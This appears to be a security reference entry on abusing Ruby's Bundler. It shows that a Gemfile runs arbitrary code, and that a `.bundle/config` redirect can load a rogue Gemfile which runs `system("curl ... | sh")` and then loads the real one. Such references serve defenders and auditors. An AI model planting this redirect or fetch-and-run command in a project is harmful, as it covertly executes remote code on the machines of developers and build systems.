---
title: bundler
tags:
- cli
- eval-sh
- config-file
references: 
- https://bundler.io/v2.5/man/bundle-config.1.html
files: ['Gemfile', '*.gemspec*', '.bundle/config']
purl: pkg:gem/bundler
---

Bundler is Ruby's package manager. It uses a Ruby file called `Gemfile` to specify dependencies and versions. Any Ruby code can be added to it and will be executed when the `bundle` command is run.

```ruby
system("curl ... | sh")
```



If the Gemfile cannot be modified, Bundler can use a local configuration in `.bundle/config` that allows changing the path of the Gemfile. 

```yaml 
---
BUNDLE_GEMFILE: "NotGemfile"
BUNDLE_PATH: "vendor/bundle"
BUNDLE_DEPLOYMENT: "true"
```

The rogue Gemfile `NotGemfile` can then be used to execute commands:
```ruby

# Execute arbitrary commands
system("curl ... | sh")
 
# Optional: load the original Gemfile to avoid errors
eval_gemfile "Gemfile"
```

Note: Bundler configuration properties defined in `$HOME/.bundle/config` and in environment variables have precedence over the local configuration file.
